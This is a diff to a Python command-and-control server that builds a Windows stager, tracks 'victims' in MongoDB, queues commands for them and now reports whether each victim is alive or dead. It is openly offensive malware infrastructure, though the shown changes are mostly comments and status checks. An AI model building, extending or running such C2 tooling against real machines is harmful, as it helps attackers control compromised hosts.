@@ -6,6 +6,7 @@ import argparse
 from flask import Flask,request
 import pymongo
 import re
+import datetime
 
 
 def generate_stager():
@@ -19,6 +20,9 @@ def generate_stager():
 	subprocess.call('cp stager.py tmp',shell=True)
 	subprocess.call('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows', cwd=r"./tmp",shell=True)
 
+
+
+## Initializes the various collections in the db with a sample record.
 def init_db(myclient):
 
 	dblist = myclient.list_database_names()
@@ -39,6 +43,8 @@ def init_db(myclient):
 		h = {'sample':'To initialize db'}
 		mycol.insert_one(h)
 
+
+## Drops the collections whenever the server quits
 def exit_db(myclient):  
 	mydb = myclient["pythonc2"]
 	cmds = mydb["commands"]
@@ -47,18 +53,34 @@ def exit_db(myclient):
 	victims.drop()
 
 
+## Inserts a command issued to a victim in the db
 def insert_cmd_db(myclient,cmd,victim_id):
 	mydb = myclient["pythonc2"]
 	mycol = mydb["commands"]
 	h = {'victim_id': victim_id,'command':cmd}
 	mycol.insert_one(h)
 
+
+
+## Shows the various victim present in the db/connected with the server. maybe dead or alive.
 def show_victims(myclient):
 	mydb = myclient['pythonc2']
 	mycol = mydb["victims"]
 	for victim in mycol.find():
 		if 'id' in victim:
 			print(victim['id'])
+
+
+## Gets the last seen of the victim. If lastseen > 60secs, vicitim considered dead.
+def get_victim_status(lastseen):
+	time = datetime.datetime.now() - lastseen
+	if time.total_seconds() > 60:
+		print("Victim Dead. Seen "+str(time.total_seconds())+" secs ago.")
+	else:
+		print("Victim alive. Seen "+str(time.total_seconds())+" secs ago.")
+
+
+## Gets the various info of the victim. Trigerred by the info command.
 def get_victim_info(myclient,victim_id):
 	mydb = myclient['pythonc2']
 	victims = mydb["victims"]
@@ -66,10 +88,14 @@ def get_victim_info(myclient,victim_id):
 	if victim:
 		for key in victim.keys():
 			if key != '_id':
-				print(key + ' ---> '+ victim[key])
+				print(key + ' ---> '+ str(victim[key]))
+
+		get_victim_status(victim['lastseen'])
 	else:
 		print("No info to show...Something is wrong..")
 
+
+## Checks if a victim id is present in the DB.
 def victim_present(myclient,victim_id):
 	mydb = myclient['pythonc2']
 	mycol = mydb["victims"]
@@ -78,6 +104,8 @@ def victim_present(myclient,victim_id):
 			return True
 	return False
 
+
+## Displays the victim menu
 def victim_menu(myclient,victim_id):
 	print("Interacting with victim - "+ victim_id)
 	while True:
@@ -91,6 +119,8 @@ def victim_menu(myclient,victim_id):
 		elif cmd == 'back':
 			print("Going back to main menu...")
 			return
+
+
 def parser():
 	parser = argparse.ArgumentParser(description='Python based C2')
 	
@@ -98,8 +128,12 @@ def parser():
 	args = parser.parse_args()
 	return args
 
+
+
 def kill_listeners(flask_process):
 	os.killpg(os.getpgid(flask_process.pid), signal.SIGTERM)
+
+
 
 def main(myclient):
 	args = parser()
@@ -152,6 +186,8 @@ def main(myclient):
 				kill_listeners(flask_process)
 			exit_db(myclient)
 			break
+
+
 
 
 
